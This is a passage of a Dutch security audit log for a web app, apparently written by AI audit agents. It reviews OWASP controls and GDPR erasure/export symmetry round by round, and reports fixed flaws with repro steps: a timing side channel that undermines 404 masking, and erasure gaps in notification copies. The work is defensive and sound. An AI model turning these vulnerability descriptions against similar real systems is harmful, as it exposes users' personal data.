groen) en runtime-omgeving-opzet. Delta sinds de vorige ronde: `8e3e9f38..0cec5281` (#1073 de vorige auditdoc
zelf, #1074 scrape-niveau deadman-alerts, #1075 verwachte-betaaldatum-kolom in de openstaande-posten-CSV
(ZZP'er), #1077 server-actions vangen `AuthorizationError` netjes af, #1078/#1080 ontwerpconcepten +
persona-sweep-docs — UI/docs, geen server-oppervlak). **Resultaat: geen nieuw KRITIEK/HOOG/MIDDEL toegangs-,
IDOR-, cross-tenant-, injectie-, upload-, SSRF-, secret- of PII-/AVG-gat. Niets te fixen; backlog-datum
bijgewerkt.** Het enige openstaande HOOG-item (`Review.comment`[subjectId] / `NoShowReport.reason` /
`ShiftHandoff`-vrije-tekst van dérden óver de betrokkene overleeft `anonymizeUser`) blijft **MENSENWERK** — een
FG/juridische bewaargrond-afweging (art. 17 vergetelheid vs. bewijs bij een lopend arbeids-/betaalgeschil), geen
agent-fix (MENSENWERK.md §5). Herbevestigd aanwezig, ongewijzigd; geen wórsere variant of nieuw veld gevonden.

**Gedekt (OWASP Top 10 / ASVS + AVG-beginselen), met bewijs:**

- **A01 Broken Access Control / IDOR — schoon.** De keten auth (`requireActor`/`requireRole`,
  `src/lib/authz.ts:181-192`) → rol → ownership/tenant (`owns`/`assertOwnership`/`ownsViaTenant`/
  `canAccessDocument`) → Zod (`safeParse`) → statusovergang-map (`assertTransition`, compound
  `updateMany({where:{id,status:from}})` TOCTOU-guard) → audit blijft intact over alle 51 `actions.ts` + 48
  `/api`-route-handlers. Nonexistent-id en cross-owner/cross-tenant-id geven een identieke "niet gevonden"-
  respons met gelijke audit-kost (anti-oracle CWE-203/208), o.a. `/api/documents/[id]`,
  `/api/samenwerkingen/[id]/dossier`. Denied-mutaties worden zélf ge-audit (`DOCUMENT_DELETE_DENIED`,
  `WORK_EXPERIENCE_DELETE_DENIED`, `DOSSIER_ACCESS_DENIED`). Delta-fixes #1077 (server-actions vangen
  `AuthorizationError` af) zijn hardening (nette inline-fout i.p.v. crash-boundary bij een mid-sessie
  geschorst/geanonimiseerd account) — de rol/ownership-checks vólgen de catch en zijn ongewijzigd.
- **A01 mass-assignment — schoon.** Geen Zod-schema/Prisma-write dat `tenantId`/`role`/`status`/`ownerId`/
  `verifiedAt` rechtstreeks vanuit client-input zet; `tenantId` uitsluitend server-side uit `currentActor()`.
- **A03 Injectie — schoon.** Geen `$queryRawUnsafe`/`$executeRawUnsafe` (enkel getagde `SELECT 1`-healthpings);
  enige `dangerouslySetInnerHTML` = het nonce-gepoorte theme-script (`layout.tsx`). Alle CSV-exports funnelen via
  `escapeCsvField`/`toCsv` (formule-injectie-guard `= + @ - \t \r`, CWE-1236, RFC 4180-quoting) — de nieuwe
  CSV-kolom `verwachte_betaaldatum` (#1075, `aging.ts agingCsv`) is een `toISOString().slice(0,10)`-datum en gaat
  net als elke cel door `toCsv` (geverifieerd). ICS-export escapet `SUMMARY/DESCRIPTION/LOCATION` (`ics.ts`),
  `UID` is altijd server-gegenereerd.
- **A02/A04 Upload & storage — schoon.** `validateUpload` (MIME-allowlist + 10 MB) + `assertContentMatchesMime`
  (magic-byte-sniff) + `assertUploadClean` (ClamAV) + `generateStorageKey` (random UUID) +
  `LocalStorageDriver.resolve` path-traversal-guard + S3 SSE-at-rest. Documentserving sandboxed.
- **A05 Headers/CSP — schoon.** Productie-CSP met per-request nonce + `strict-dynamic`, `object-src 'none'`,
  `frame-ancestors 'none'`, `base-uri 'self'`, `form-action 'self'`; `next.config.mjs` COOP/CORP/HSTS/
  Permissions-Policy/`X-Robots-Tag noindex`.
- **A07 Auth/sessie — schoon.** `currentActor()` leest rol/status/tenant/wachtwoord-stempel vers uit de DB →
  live intrekking bij schorsing/anonimisering/tenant-suspend/wachtwoordwijziging. `/admin` triple-gated
  (middleware-edge + elke page + elke action). Login timing-equalizer-bcrypt (CWE-208) + rate-limit.
- **A09 Logging — schoon.** `logger` redact op key-substring (password/secret/token/iban/bsn/phone) én
  e-mail-value-patroon, ook op de message zelf; de enige rauwe e-mail-`console.log` (`NoopMailSender`) is
  non-productie-gepoort.
- **A10 SSRF / open redirect — schoon.** Geen server-side `fetch` met user-gestuurde host (`http-verify.ts`/
  `routing.ts` nemen enkel een env-geconfigureerde base-URL); geen niet-relatieve `redirect()` uit client-input.
- **Foutafhandeling — schoon.** `error.tsx`/`global-error.tsx` tonen enkel generieke NL-tekst + opaque `digest`.
- **AVG art. 17 erasure ↔ art. 15/20 export-symmetrie — schoon.** Elk vrije-tekstveld in `buildAccountExport`
  heeft een matchende redactie-tak in `anonymizeUser` (veld-voor-veld geverifieerd, incl. duplicaat-kopieën op
  feeds/notificaties/domein-events/audit-metadata van ándere gebruikers). `TaxFilingRequest.partnerName` =
  bedrijfsnaam (belastingkantoor/gemachtigde), geen natuurlijk-persoon-PII — geen gat. Enige uitzondering: het
  geparkeerde HOOG-MENSENWERK-item.
- **AVG dataminimalisatie & k-anonimiteit — schoon.** `MARKET_RATE_MIN_SAMPLE ≥ 10` server-side afgedwongen
  (`job-rate-bands.ts`, `server-only`); `/api/metrics` enkel geaggregeerde gauges, fail-closed achter
  `CRON_SECRET`. Retentie-sweeps (`run-all`) daadwerkelijk bedraad + gauge-gemonitord.
- **Dependencies.** `npm audit --omit=dev` = **0** (resterende meldingen enkel in devDependencies).

**Waargenomen (geparkeerd, geen toegangs-/PII-gat) — build-tijd Google-Fonts-fetch:**

- **LAAG — beschikbaarheid/supply-chain (OWASP A08 — softwareketen-integriteit/availability).** `src/app/ontwerp/
layout.tsx` laadt `Cormorant Garamond` via `next/font/google`, wat `next build` een live fetch naar
  `fonts.gstatic.com` laat doen. Bij een Google-Fonts-uitval/rate-limit faalt de `check`-poort (`npm run build`)
  hard — waargenomen op deze ronde: `NextFontError: Failed to fetch 'Cormorant Garamond' from Google Fonts`
  (retry 3/3) blokkeerde één CI-run; her-trigger loste het op. Geen datalek en geen runtime-privacy-issue
  (`next/font` self-host de font bij build, dus de eindgebruiker verbindt nóóit met Google — dat deel is juist
  goed). Puur een **merge-availability-/leverketen-risico**: elke PR hangt af van een externe host tijdens de
  build. **Aanbevolen fix (devops/mens, buiten deze docs-only PR):** de font self-hosten via `next/font/local`
  (woff2 in de repo) of de `ontwerp`-designlab-route uit de productie-build sluiten — dan is de build
  deterministisch en hermetisch. Dit is een reliability-/ketenpunt, geen agent-security-fix binnen scope.

## Ronde 2026-08-13 (basis: `main` @ 8e3e9f38) — geen nieuwe gaten

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken
(1: alle server actions + `/api`-route-handlers → auth→rol→ownership→Zod→actie→audit + IDOR + mass-assignment;
2: cross-tenant/franchiser-isolatie + AVG erasure/export-symmetrie + dataminimalisatie + k-anonimiteit + retentie;
3: injectie (SQL/XSS/CSV/SSRF) + upload/storage + secrets + headers/CSP + foutafhandeling + CSRF), plus
onafhankelijke orchestrator-probes over de héle repo. Delta sinds de vorige ronde: `ac921eb6..8e3e9f38`
(#1068–#1072 — performance-grace stille-faal-gauge, koud-lopende opdracht als next-action/nav-badge,
uitgaven-per-ZZP'er-uitsplitsing op /inzicht, opdrachtlijst-sortering-op-aandacht). **Resultaat: geen nieuw
KRITIEK/HOOG/MIDDEL toegangs-, IDOR-, cross-tenant-, injectie-, upload-, SSRF-, secret- of PII-/AVG-gat. Niets
te fixen; backlog-datum bijgewerkt.** Het enige openstaande HOOG-item (`NoShowReport.reason`/`Review.comment`
[subjectId]/`ShiftHandoff`-vrije-tekst van dérden óver de betrokkene overleeft `anonymizeUser`) blijft
**MENSENWERK** — een FG/juridische bewaargrond-afweging (art. 17 vergetelheid vs. bewijs bij een lopend
arbeids-/betaalgeschil), geen agent-fix (MENSENWERK.md §5). Herbevestigd nog aanwezig, ongewijzigd.

**Gedekt (OWASP Top 10 / ASVS + AVG-beginselen), met bewijs:**

- **A01 Broken Access Control / IDOR — schoon.** Alle 51 `actions.ts` + 37 `/api`-route-handlers volgen de keten
  auth (`requireActor`/`requireRole`) → rol → ownership/tenant (`owns`/`assertOwnership`/`ownsViaTenant`/
  `canAccessDocument`) → Zod (`safeParse`) → statusovergang-map (`assertTransition`, compound
  `updateMany({where:{id,status:from}})` TOCTOU-guard) → audit. Nonexistent-id en cross-owner/cross-tenant-id
  geven een identieke "niet gevonden"-respons met gelijke audit-kost (anti-oracle CWE-203/208), o.a.
  `/api/documents/[id]`, `/api/samenwerkingen/[id]/dossier`, `admin/shift-overnames/actions.ts`.
- **A01 mass-assignment — schoon.** Registratie-Zod beperkt `role` tot `["FREELANCER","CLIENT"]`
  (`validation.ts`); CSV-import her-valideert de rol server-side (`assertImportRole`). Geen Zod-schema dat
  `tenantId`/`role`/`status`/`ownerId`/`verifiedAt` rechtstreeks vanuit client-input in een privileged write laat.
- **A01 cross-tenant (FRANCHISER, multi-tenant) — schoon.** `tenantId` wordt uitsluitend server-side afgeleid via
  `currentActor()` → `user.findUnique` op de sessie-id (nooit uit formData/searchParams); `tenant-stats.ts`,
  `signals.ts`, `roster-dossier.ts` en elke `franchise/**/actions.ts`-mutatie her-scopet op tenant met
  anti-oracle-regressietests. Delta (`getClientColdJobs`, `getClientSpendBreakdown`, franchise-renewal-badge)
  is strikt eigen-gebruiker/eigen-company-gescopet (`company:{userId}`, `counterpartyUserId:userId`).
- **A03 Injectie — schoon.** Geen `$queryRawUnsafe`/`$executeRawUnsafe`; enkel getagde `SELECT 1`-healthpings.
  Enige `dangerouslySetInnerHTML` = het nonce-gepoorte theme-script (`layout.tsx`). Alle CSV-exports funnelen via
  `escapeCsvField`/`toCsv` (formule-injectie-guard `= + @ - \t \r`, CWE-1236, + RFC 4180-quoting).
- **A02/A04 Upload & storage — schoon.** `validateUpload` (MIME-allowlist + 10 MB) + `assertContentMatchesMime`
  (magic-byte-sniff tegen vervalste Content-Type) + `generateStorageKey` (random UUID, nooit bestandsnaam als pad)
  - `LocalStorageDriver.resolve` path-traversal-guard + S3 SSE-at-rest afgedwongen. Documentserving sandboxed
    (`sandboxedDocumentHeaders`: `CSP: sandbox; default-src 'none'`, `nosniff`, `CORP same-origin`, `no-store`).
- **A05 Beveiligingsconfig / headers — schoon.** Productie-CSP met per-request nonce + `strict-dynamic`,
  `object-src 'none'`, `frame-ancestors 'none'`, `base-uri 'self'`, `form-action 'self'` + violation-reporting;
  `next.config.mjs` zet COOP/CORP same-origin, `X-Content-Type-Options`, strak `Permissions-Policy`.
- **A07 Auth/sessie — schoon.** `/admin` triple-gated (middleware-edge + elke page + elke action), niet
  client-side. Cron-/metrics-/webhook-endpoints fail-closed achter `timingSafeEqual`-Bearer/HMAC.
- **A10 SSRF — schoon.** Geen server-side `fetch` met user-gestuurde URL; de enige uitgaande integratie
  (`http-verify.ts`, iDIN) neemt zijn base-URL uitsluitend uit `process.env.IDENTITY_API_BASE`.
- **Open redirect — schoon.** Enige niet-relatieve `redirect()` (`abonnement/actions.ts`) komt uit de
  server-side provider-response `startCheckout`, niet uit client-input; `/api/media/[...key]` redirect naar een
  presigned URL na key-validatie (moet een bekende `Company.logoKey` zijn).
- **Foutafhandeling — schoon.** `error.tsx`/`global-error.tsx` tonen enkel een generieke NL-tekst + opaque
  `digest`, nooit `message`/`stack`. `mail-sender` logt in productie geen ontvanger/onderwerp.
- **AVG art. 17 erasure ↔ art. 15/20 export-symmetrie — schoon.** `anonymizeUser` scrubt ~20 tabellen/
  notificatie-bodies/domein-event-payloads/audit-metadata (incl. duplicaat-kopieën op feeds van ándere
  gebruikers), verwijdert credentials/documenten/logo race-free ná de transactie (CWE-367), en blokkeert
  anonimisering zolang de actor nog een live Tenant bezit. Elk vrije-tekstveld in `buildAccountExport` heeft een
  matchende redactie-tak (veld-voor-veld geverifieerd). Uitzondering: het geparkeerde HOOG-MENSENWERK-item.
- **AVG dataminimalisatie & k-anonimiteit — schoon.** Franchise-selects zijn smal (geen BSN in het schema);
  `MARKET_RATE_MIN_SAMPLE ≥ 10` server-side afgedwongen + regressietest. `/api/metrics` geeft enkel
  geaggregeerde gauges (incl. de nieuwe `zzp_performances_overdue_grace`), geen rij-PII, fail-closed achter
  `CRON_SECRET`.
- **Dependencies.** `npm audit --omit=dev` = **0**; de 3 resterende meldingen (js-yaml e.a.) zitten uitsluitend
  in devDependencies en worden niet meegeleverd naar productie.

## Ronde 2026-08-12b (basis: `main` @ ac921eb6) — geen nieuwe gaten

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken,
plus onafhankelijke orchestrator-probes over de héle repo (niet alleen de delta). Basis-delta sinds de vorige
ronde: `fdcc8394..ac921eb6` (#1060–#1067 — shift-overname-afwijsreden-erasure-fix (#1060, al OPGELOST vorige
ronde), reviews-reveal stille-faal-gauge, CSV-diensten-import exacte diensttijden, /franchise-badge-telling,
winst-per-maand-trend op /inzicht, live-readiness-releasepoorten, download-routes vangen `AuthorizationError`
netjes af). **Resultaat: geen nieuw KRITIEK/HOOG/MIDDEL toegangs-, IDOR-, cross-tenant-, injectie-, upload-,
SSRF-, secret- of PII-/AVG-gat. Niets te fixen; backlog-datum bijgewerkt.**

**Gedekt (OWASP Top 10 / ASVS + AVG-beginselen), met bewijs:**

- **A01 Broken Access Control / IDOR — schoon.** Delta-mutaties (`samenwerkingen/actions.ts sendCredentialReminder`,
  `no-show-actions.ts reportNoShow`, `kandidaten/actions.ts saveApplicationNote`) zijn concurrency-hardening
  (Serializable-transactie + begrensde `P2034`-retry rond dedup-check+create+audit) — de keten
  auth→rol→ownership/tenant→Zod→actie→audit blijft intact; de anti-oracle "niet gevonden"-maskering (CWE-203) is
  ongewijzigd. Documentdownload (`/api/documents/[id]`), factuur-/prestatie-PDF en samenwerking-dossierroutes:
  ownership + audit op zowel de geslaagde als de geweigerde/niet-gevonden tak (timing-oracle CWE-208 dicht).
- **A01 cross-tenant (FRANCHISER, multi-tenant) — schoon.** Nieuwe `franchiseRenewals`-nav-badge (`signals.ts`)
  leidt `tenantId` server-side af uit een verse `user.findUnique` op de eigen sessie-id; geeft enkel een
  aggregate-integer terug (geen rij-PII). Geen mass-assignment van `tenantId`; elke detail-lezing her-scopet.
- **A03 Injectie — schoon.** Geen `$queryRawUnsafe`/string-geconcateneerd SQL (enkel getagde `SELECT 1`-health­pings);
  enige `dangerouslySetInnerHTML` = het nonce-gepoorte theme-script (`layout.tsx`). Alle CSV-exports
  (`exportForecastCsv`, `exportObligationsCsv` → gedeelde `toCsv`) neutraliseren formule-injectie via
  `escapeCsvField` (`= + @ - \t \r`, CWE-1236) op élke cel incl. tegenpartij-naam/opdrachttitel/factuurnummer.
- **A02/A04 Upload & storage — schoon.** `validateUpload` (type+grootte, 10 MB) + `assertContentMatchesMime`
  (magic-byte-sniff tegen vervalste Content-Type) + `generateStorageKey` (random UUID, nooit de bestandsnaam als
  pad) + `LocalStorageDriver.resolve` path-traversal-guard + S3 SSE-at-rest expliciet afgedwongen.
- **A05 Beveiligingsconfig / headers — schoon.** Productie-CSP met per-request nonce + `strict-dynamic`
  (`buildCsp`); `object-src 'none'`, `frame-ancestors 'none'`, `base-uri 'self'`, `form-action 'self'`;
  privé-documentheaders sandboxed (`sandboxedDocumentHeaders`, COOP/CORP same-origin).
- **A07 Auth/sessie — schoon.** Login: timing-equalizer-bcrypt tegen e-mail-enumeratie (CWE-208), per-IP+e-mail
  rate-limit, onderhoudspoort vóór élke DB-call. Wachtwoord-reset: sha256-gehasht token, 1u-TTL, atomair
  eenmalig gebruik (`consumeResetToken updateMany({usedAt:null})`), host-header-poisoning getest
  (`reset-poisoning.test.ts`). `currentActor()` leest rol/status/tenant/wachtwoord-stempel vers uit de DB →
  live intrekking bij schorsing/anonimisering/tenant-suspend/wachtwoordwijziging.
- **AVG art. 17 erasure ↔ art. 15/20 export-symmetrie — schoon.** De "duplicate-copy erasure gap"-klasse blijft
  gedekt: `SHIFT_HANDOFF_REJECTED` (deze delta, gedeelde `shiftHandoffRejectedNotificationBody`),
  `NO_SHOW_REPORTED`, `INVOICE_CREDITED`, `DISPUTE_OPENED`, `IDEA_STATUS/COMMENT` — elke vrije-tekst-kopie op de
  feed van een ándere gebruiker wordt in `anonymizeUser` exact-gereconstrueerd en geredact; audit-metadata-PII
  (e-mail/naam/reden) via `scrubAuditMetadataPii` (exact-match, geen substring-collateral). Nieuwe delta-code
  introduceert geen nieuw vrije-tekst-/PII-veld of notificatietype.
- **AVG dataminimalisatie & k-anonimiteit — schoon.** `/api/metrics` geeft enkel geaggregeerde gauges (geen
  naam/e-mail/IP/vrije tekst), fail-closed achter `CRON_SECRET`-Bearer (`timingSafeEqual`). `profit-trend.ts`
  (nieuw) is strikt eigen-gebruiker-gescopet (`ownerUserId: actor.id`), geen cross-user-aggregatie; de
  markttarief-benchmark (`MARKET_RATE_MIN_SAMPLE ≥ 10`) is in deze delta onaangeraakt.
- **Dependencies.** `npm audit --omit=dev` = **0** (de 3 resterende `npm audit`-meldingen — js-yaml e.a. — zitten
  uitsluitend in devDependencies en worden niet meegeleverd naar productie).

## Ronde 2026-08-12 (basis: `main` @ fdcc8394)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken
(AVG-erasure/export-symmetrie; cross-tenant/franchiser-isolatie; API-route-handlers/upload/injectie/SSRF),
plus de delta sinds de vorige ronde (`560caa69..fdcc8394`, #1054–#1059 — timing-zijkanaal-fix op de
404-maskering, mail-aflever-heartbeat/`RecordingMailSender`, anti-oracle op `createPerformance`, IB-deadline-
next-action, /certificaten-badge-drift). Gedekt: (1) **AVG/erasure** — `anonymizeUser` vs. álle 70 modellen met
vrije-tekst-/PII-velden, export↔erasure-symmetrie, de "duplicate-copy erasure gap"-klasse (notificatie-body-
kopieën op ándermans feed). (2) **cross-tenant** — `tenancy.ts`, alle `franchise/**`/`kandidaten/**`/
`admin/franchises/**`-actions+pages, `signals.ts`/`pending-tasks.ts` FRANCHISER-takken, `roster-dossier.ts`
(cross-tenant overloop-werk), mass-assignment van `tenantId` — schoon (server-side afgeleide tenantId, elke
detail-lezing her-scopet). (3) **API/upload/injectie** — alle `/api/**`, storage-traversal + magic-byte-sniff,
CSV-formule-injectie (`escapeCsvField`), push-SSRF-allowlist, open-redirect, foutlek, secrets — schoon. Nieuwe
delta-code (mail-heartbeat: geen PII opgeslagen, fail-open observability; anti-oracle createPerformance correct).
`npm audit --omit=dev` = **0**.

**Resultaat: één HOOG AVG-gat OPGELOST (rood→groen) — de door de BESLISSER (FRANCHISER/ADMIN) zelf getypte
shift-overname-afwijsreden (`ShiftHandoff.decisionNote`) overleefde de erasure van de beslisser als verbatim kopie
in de `SHIFT_HANDOFF_REJECTED`-notificatie op de feed van de AANVRAGER. Cross-tenant- en API-/injectie-oppervlak
schoon (geen nieuw KRITIEK/HOOG toegangs-, IDOR-, injectie-, SSRF- of overig PII-lek).**

### OPGELOST — HOOG (AVG art. 17, CLAUDE.md regel 2/5): `ShiftHandoff.decisionNote` bleef leesbaar in de SHIFT_HANDOFF_REJECTED-notificatie op de aanvragersfeed na erasure van de beslisser

- **Repro (was):** `rejectShiftHandoff` (`admin/shift-overnames/actions.ts:150`) interpoleert de door de BESLISSER
  (FRANCHISER/ADMIN) zelf getypte `decisionNote` (vrije tekst → PII van de beslisser) verbatim in de **body** van de
  `SHIFT_HANDOFF_REJECTED`-notificatie — die op de feed van de **AANVRAGER** (`requestedByUserId`) landt, een ándere
  gebruiker dan de beslisser (`decidedByUserId`). Bij een AVG-verwijdering van de beslisser (`anonymizeUser`) nulde de
  erasure wél de bron `ShiftHandoff.decisionNote` (`updateMany({ where:{ decidedByUserId } })`), maar de generieke
  eigen-feed-wipe `notification.updateMany({ where:{ userId } })` raakt alleen de notificaties die de betrokkene zélf
  ontving — nooit de kopie op de aanvragersfeed. Die overleefde art. 17 en werd bovendien via `account-export.ts`
  (dat `Notification.body` prijsgeeft) aan de aanvrager in diens eigen inzage-export permanent getoond. Exact de
  "duplicate-copy erasure gap"-klasse die de codebase al herhaaldelijk dichtte (dispuutreden-3-kopie,
  no-show-reden-2-kopie, creditreden-3-kopie, `Idea.title`-notificatietitel). FRANCHISER is een normale, erasbare rol
  (`canAnonymizeUser` blokkeert alleen ADMIN + self), dus reëel exploiteerbaar; de code-comment lijstte
  `SHIFT_HANDOFF_REJECTED` juist onterecht als "gedekt door de eigen-feed-wipe".
- **Geschonden regel:** AVG art. 17 (onvolledige erasure) + CLAUDE.md regel 2/5; OWASP A01 (privacy-datalek). Interne
  inconsistentie met de bestaande no-show-/credit-reconstruct-en-redact-patronen in dezelfde file.
- **Fix (deze PR):** gedeelde body-builder `shiftHandoffRejectedNotificationBody({jobTitle, note})` in
  `src/lib/shift-handoff.ts` (één bron, geen drift tussen schrijver en erasure, spiegelt
  `noShowReportedNotificationBody`); `rejectShiftHandoff` gebruikt 'm nu. `anonymizeUser` verzamelt vóór de transactie
  `ownDecidedRejectedHandoffs` (`decidedByUserId=userId, status=REJECTED, decisionNote≠null`) en redact binnen de
  transactie de exact-gereconstrueerde `SHIFT_HANDOFF_REJECTED`-body op de feed van elke aanvrager (gescopet op de
  deterministische body, dus nooit de afwijzing van een ándere beslisser). De onterechte comment is gecorrigeerd.
  Tests (rood→groen): +1 in `anonymize-erasure.test.ts` (notificatie-kopie op aanvragersfeed geredact) + 1
  locked-body-unit in `shift-handoff.test.ts`.
- **Restrisico (mens/FG):** bestaande FRANCHISER-accounts kunnen al afgewezen handoffs hebben wier notificatiekopie
  een eenmalige backfill-redactie vereist naast de code-fix. Flag bij een FRANCHISER-erasureverzoek in productie.

## Ronde 2026-08-11b (basis: `main` @ 560caa69)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken
(API-route-handlers/IDOR; server-action-mutatieketens; privacy/AVG), plus de delta sinds de vorige ronde
(`3879adba..560caa69`, #1047–#1053 — `Idea.title`-erasure-lek, gelekt-wachtwoord-controle (HIBP, achter vlag),
opdrachtgever-weekstrip, cancelInvoice-dispuutbevriezing, WIK-incassokosten, bemiddelaar-verlengsignaal,
support-body-cap). Gedekt: (1) **API-oppervlak** — alle `/api/**`-routes, de dynamische `[id]`/`[...key]`-routes,
push-endpoint-SSRF-allowlist (exacte/subdomein-hostmatch, https-only — geen substring-bypass), CSV-formule-injectie
(`toCsv`/`escapeCsvField` neutraliseert `= + @ - \t \r`), cron-Bearer + `timingSafeEqual`, webhook-handtekening +
idempotentie + body-cap. (2) **Server actions** — alle 49 `actions.ts`: auth→rol→ownership/tenant→Zod→actie→audit
consequent; geen mass-assignment; statusovergangen via expliciete `assert*Transition`; TOCTOU-geldpaden via
`updateMany({ where:{id,status:from} })`; cross-tenant via `ownsViaTenant`/`assertSameTenant`. (3) **Privacy/AVG** —
export↔erasure-symmetrie (incl. de `Idea.title`-notificatietitel-kopie uit #1047), k-anonimiteit
(`MARKET_RATE_MIN_SAMPLE = 10`), PII-in-logs onderdrukt in productie, HIBP-controle bevestigd k-anoniem (alleen
5-teken SHA-1-prefix verlaat de server, fail-open). `npm audit --omit=dev` = **0**; enige `dangerouslySetInnerHTML`
= het nonce-gepoorte theme-script; geen `$queryRawUnsafe`/`eval`; geen server-side fetch met user-gestuurde URL.

**Resultaat: één LAAG timing-zijkanaal OPGELOST (rood→groen) — de niet-gevonden-tak van de gevoelige
resource-op-id-routes deed géén audit-write terwijl de geweigerde-tak dat wél deed, wat het bewust gesloten
existence-oracle (CWE-203) via de responstijd heropende. API-, server-action- en privacy-oppervlak verder schoon
(geen nieuw KRITIEK/HOOG toegangs-, IDOR-, injectie-, cross-tenant- of PII-lek).**

### OPGELOST — LAAG (CWE-208 / residual CWE-203, OWASP A01/A04, CLAUDE.md regel 5): timing-zijkanaal ondermijnt de 404-maskering op de gevoelige resource-op-id-routes

- **Repro (was):** `/api/documents/[id]`, `/api/facturen/[id]/pdf`, `/api/prestaties/[id]/pdf` en de drie
  `/api/samenwerkingen/[id]/{dossier,dba-dossier,modelovereenkomst}`-routes geven bewust een IDENTIEKE 404 voor
  zowel "id bestaat niet" als "id bestaat maar je bent geen partij" (existence-oracle-maskering, CWE-203 — een 403
  op een vreemd-maar-geldig id zou het bestaan van een gevoelig document VOG/diploma/BIG/factuur verraden). Maar de
  **verboden**-tak deed vóór de 404 een audit-write (`requestMeta()` + `await audit(...)`), terwijl de
  **niet-gevonden**-tak direct terugkeerde zónder DB-write. Dat verschil in werk is meetbaar aan de responstijd
  (onbekend < verboden): een timing-zijkanaal (CWE-208) dat exact het oracle heropent dat de 404-maskering dicht.
  Praktische exploiteerbaarheid laag (id's zijn hoge-entropie cuids, niet-enumereerbaar; netwerk-jitter maskeert het
  signaal), vandaar LAAG — maar het is een reëel gat tegenover een expliciet, uitgebreid becommentarieerd
  beveiligingsdoel op de gevoeligste routes.
- **Geschonden regel:** CWE-208 (Observable Timing Discrepancy) / residual CWE-203; OWASP A01 (Broken Access
  Control) + A04 (Insecure Design); CLAUDE.md regel 5 (auditplicht) — de niet-gevonden-tak auditte bovendien niets,
  dus recon op niet-bestaande id's was onzichtbaar in het spoor.
- **Fix (deze PR):** gedeelde helper `auditDeniedAccess` (`src/lib/security/access-audit.ts`) — één afsluitpunt voor
  béíde uitkomsten dat identiek werk doet (`requestMeta` + één audit-write) vóór de identieke 404. Alle 6 routes
  roepen 'm nu aan op zowel de niet-gevonden- (`outcome: "not-found"`) als de verboden-tak (`outcome: "forbidden"`);
  de responstijd onderscheidt de twee niet meer en een recon-probe op een niet-bestaand id staat nu óók in het
  auditspoor. Tests (rood→groen): `documents/[id]/route.test.ts` (versterkt: niet-gevonden vereist nu de DENIED-audit),
  `pdf-routes-audit.test.ts` (+3 niet-gevonden), `dossier-routes-audit.test.ts` (+2 niet-gevonden), nieuwe
  `security/access-audit.test.ts` (+2 helper-unit). De 6 bestaande verboden-tak-tests blijven groen (pariteit).

## Ronde 2026-08-11 (basis: `main` @ 3879adba)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken
(API-route-handlers/IDOR; server-action-mutatieketens; privacy/AVG), plus de delta sinds de vorige ronde
(`5ec16e60..3879adba`, #1041–#1046 — aangifte-entitlement-`currentPeriodEnd`-fix, cron-heartbeat-faalattributie,
losse-factuur-`createInvoice`-rate-limiter, IB-aangifte-agenda-event, betaal-forecast op `/openstaand`). Gedekt:
(1) **API-oppervlak** — alle `/api/**`-routes, in het bijzonder de dynamische `[id]`/`[...key]`-routes
(documents/media/facturen-pdf/prestaties-pdf/admin-facturatie-pdf/dossier/dba-dossier/modelovereenkomst/
account-export/administratie-export/agenda/billing-webhook): elke dynamische route doet auth → rate-limit →
ownership → data → audit, met 404-masking (CWE-203) op geweigerde toegang; path-traversal-guard in
`LocalStorageDriver.resolve`; cron-Bearer via `authorizeCron` + `timingSafeEqual`; webhook-handtekening +
idempotentie-ledger + body-cap. (2) **Server actions** — alle 47 `actions.ts`: auth→rol→ownership/tenant→Zod→
actie→audit consequent; geen mass-assignment (hand-gebouwde Zod-schema's, geen `parse(formData)`-passthrough);
statusovergangen via de expliciete `assert*Transition`-maps; TOCTOU-geldpaden via `updateMany({ where:{id,status:from} })`
in `$transaction`; cross-tenant via `ownsViaTenant`/`assertSameTenant`. (3) **Privacy/AVG** — export↔erasure-symmetrie,
k-anonimiteit (`MARKET_RATE_MIN_SAMPLE = 10`, regressietest bewaakt de vloer), PII-in-logs (mail/storage-loggers
onderdrukken PII in productie), retentietaken, webcal-token-liveness. `npm audit --omit=dev` = **0**; enige
`dangerouslySetInnerHTML` = het nonce-gepoorte theme-script; geen `$queryRawUnsafe`/`eval`.

**Resultaat: één MIDDEL privacy-gat OPGELOST (rood→groen) — `Idea.title`-lek in notificatietitels op ándermans feed
overleefde de erasure. API- en server-action-oppervlak schoon (geen nieuw KRITIEK/HOOG toegangs-, IDOR-, injectie-,
cross-tenant- of PII-lek). Eén bekende, geparkeerde `Review.comment`-erasure-afweging blijft bij de mens (FG).**

### OPGELOST — MIDDEL (AVG art. 17, CLAUDE.md regel 2/5): `Idea.title` bleef leesbaar in de notificatietitels op ándermans feed na erasure van de indiener

- **Repro (was):** `setIdeaStatus` (`ideeen/actions.ts:157`) en `addComment` (`:196`) interpoleerden de door de
  indiener geschreven `Idea.title` (vrije tekst, PII-risico) verbatim in de **titel** van de IDEA_STATUS-/
  IDEA_COMMENT-notificaties — die óók naar de feeds van ándere gebruikers (stemmers/reageerders,
  `Notification.userId != de indiener`) gaan. Bij een AVG-verwijdering (`anonymizeUser`) redigeerde de erasure
  wél `Idea.title` op de `Idea`-rij, maar de brede `notification.updateMany({ where: { userId } })` raakt alleen
  de EIGEN feed van de betrokkene én enkel de **body**. De titel-kopie op ándermans feed werd nergens geraakt,
  overleefde art. 17 en werd bovendien via `account-export.ts` (dat `Notification.title` prijsgeeft) aan die andere
  gebruiker als onderdeel van diens eigen inzage-export getoond — permanent, ook na de verwijdering. Exact de
  "duplicate-copy erasure gap"-klasse die de codebase al herhaaldelijk dichtte (dispuutreden 3-kopie,
  no-show-reden 2-kopie, creditreden 3-kopie), hier over het hoofd gezien.
- **Geschonden regel:** AVG art. 17 (onvolledige erasure) + CLAUDE.md regel 2/5; interne inconsistentie met de
  bestaande drie-kopie-erasurepatronen in dezelfde file.
- **Fix (deze PR):** gedeelde titel-builders `ideaStatusNotificationTitle`/`ideaCommentNotificationTitle` in
  `src/lib/ideas.ts` (één bron, geen drift met de bron in `ideeen/actions.ts`, spiegelt `noShowReportedNotificationBody`);
  `anonymizeUser` verzamelt de eigen idee-titels vóór de transactie en redact de exact-gereconstrueerde
